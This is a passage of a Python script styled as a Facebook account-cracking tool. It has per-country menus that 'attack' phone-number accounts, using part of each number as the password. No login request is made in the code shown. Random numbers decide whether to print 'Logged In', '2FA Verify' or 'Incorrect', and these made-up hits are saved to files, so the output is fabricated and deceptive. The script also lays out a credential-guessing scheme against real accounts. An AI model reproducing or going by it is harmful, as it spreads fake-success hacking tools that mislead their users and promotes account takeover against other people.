                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(chin)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def INDO():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Indonesia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(indo)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def BRA():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Brazil',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(bra)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def MEX():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Mexico',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(mex)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def PHIL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Philippines',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(phil)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def VT():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Vietnam',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(vt)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def THAI():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Thailand',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
